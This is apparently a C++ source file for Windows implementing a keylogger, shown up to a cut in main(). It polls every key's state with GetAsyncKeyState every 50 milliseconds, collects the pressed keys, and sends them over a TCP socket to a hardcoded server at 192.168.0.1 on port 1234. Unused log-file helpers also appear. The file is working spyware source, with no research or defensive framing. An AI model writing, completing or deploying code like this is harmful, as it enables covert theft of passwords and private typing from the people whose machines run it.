#include <iostream>
#include <chrono>
#include <thread>
#include <fstream>
#include <Windows.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

std::ofstream openLogFile(const std::string& filename) {
    std::ofstream logfile(filename, std::ios_base::app);
    if (!logfile) {
        throw std::runtime_error("failed to open log file.");
    }
    return logfile;
}

bool isLetterKey(char key) {
    return (key >= 'A' && key <= 'Z');
}

void writeToFile(std::ofstream& logfile, char key) {
    logfile << key;
}

void sendToServer(const std::string& serverIP, int port, const std::string& data) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        throw std::runtime_error("Failed to initialize Winsock.");
    }

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        WSACleanup();
        throw std::runtime_error("Failed to create socket.");
    }

    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    serverAddr.sin_addr.s_addr = inet_addr(serverIP.c_str());

    if (connect(clientSocket, reinterpret_cast<sockaddr*>(&serverAddr), sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(clientSocket);
        WSACleanup();
        throw std::runtime_error("Failed to connect to the server.");
    }

    send(clientSocket, data.c_str(), static_cast<int>(data.length()), 0);

    closesocket(clientSocket);
    WSACleanup();
}

void keyboardListener(const std::string& serverIP, int port) {
    std::string data;

    while (true) {
        for (int i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) & 0x8000) {
                char key = static_cast<char>(i);

                if (isLetterKey(key)) {
                    key += 32;
                }

                data += key;
            }
        }

        if (!data.empty()) {
            try {
                sendToServer(serverIP, port, data);
                data.clear();
            }
            catch (const std::exception& e) {
                std::cerr << "Error sending data to the server: " << e.what() << std::endl;
            }
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
}

int main() {
    std::string serverIP = "192.168.0.1";
    int port = 1234;

    try {
        keyboardListener(serverIP, port);
    }
